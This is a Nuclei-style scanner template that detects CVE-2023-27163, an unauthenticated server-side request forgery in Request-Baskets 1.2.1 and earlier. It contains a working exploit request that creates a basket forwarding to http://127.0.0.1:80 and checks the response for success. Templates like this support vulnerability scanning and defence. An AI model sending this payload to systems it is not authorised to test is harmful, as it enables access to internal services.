id: CVE-2023-27163

info:
  name: Request-Baskets <= 1.2.1 - SSRF via forward_url
  author: Jaenact
  severity: medium
  description: |
    Request-Baskets <= 1.2.1 allows unauthenticated SSRF via the forward_url
    parameter when creating a new basket.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-27163
    - https://github.com/darklynx/request-baskets
    - https://hub.docker.com/r/darklynx/request-baskets
    - https://infosecwriteups.com/exploit-analysis-request-baskets-v1-2-1-server-side-request-forgery-ssrf-688fffd1f424
  tags: cve,ssrf,request-baskets,unauthenticated,http,proxy,golang

http:
  - method: POST
    path:
      - "{{BaseURL}}/api/baskets/{{randstr}}"

    headers:
      Content-Type: application/json

    body: |
      {
        "forward_url": "http://127.0.0.1:80",
        "proxy_response": true,
        "insecure_tls": false,
        "expand_path": true,
        "capacity": 250
      }

    matchers:
      - type: status
        status:
          - 201

      - type: word
        part: body
        words:
          - "token"